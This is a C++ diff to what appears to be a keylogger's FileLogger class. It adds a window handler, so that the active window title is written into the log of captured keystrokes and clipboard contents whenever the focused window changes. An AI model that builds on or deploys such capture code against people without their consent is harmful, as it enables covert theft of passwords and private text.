@@ -36,8 +36,18 @@ bool FileLogger::open(IKeycodeMapper* mapper, std::string filename) {
 }
 
 bool FileLogger::open(IKeycodeMapper* mapper, IClipboardHandler* clipboardHandler, std::string filename) {
+    return open(mapper, clipboardHandler, nullptr, filename);
+}
+
+bool FileLogger::open(
+    IKeycodeMapper* mapper,
+    IClipboardHandler* clipboardHandler,
+    IWindowHandler* windowHandler,
+    std::string filename
+) {
     _mapper = mapper;
     _clipboard = clipboardHandler;
+    _window = windowHandler;
 
     std::ifstream file;
     bool exists = false;
@@ -72,6 +82,16 @@ void FileLogger::logKeycode(int keycode, KeyState state) {
         writeHeader(_stream);
     }
     _lastKeystroke = curtime;
+
+    if (_window) {
+        std::string winStr = _window->getWindowString();
+        if (winStr != _lastWindow) {
+            _stream << std::endl << std::endl
+                << "[WINDOW: " << winStr << " ]"
+                << std::endl;
+            _lastWindow = winStr;
+        }
+    }
 
     if (_mapper) {
         if (_mapper->isCtrl(keycode)) {
